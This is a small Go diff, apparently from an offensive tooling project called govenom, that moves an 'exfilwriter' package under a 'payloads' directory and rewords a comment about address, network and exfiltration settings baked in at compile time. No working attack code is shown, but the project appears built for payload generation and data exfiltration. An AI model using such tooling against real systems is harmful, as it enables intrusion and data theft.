@@ -10,11 +10,11 @@ import (
 	"strings"
 	"time"
 
-	"govenom/exfilwriter"
+	"govenom/payloads/exfilwriter"
 )
 
 var (
-	// set during compilation/linking via -X ldflag
+	// set during compilation via -X ldflag
 	address      string
 	network      string
 	exfilCfg     string
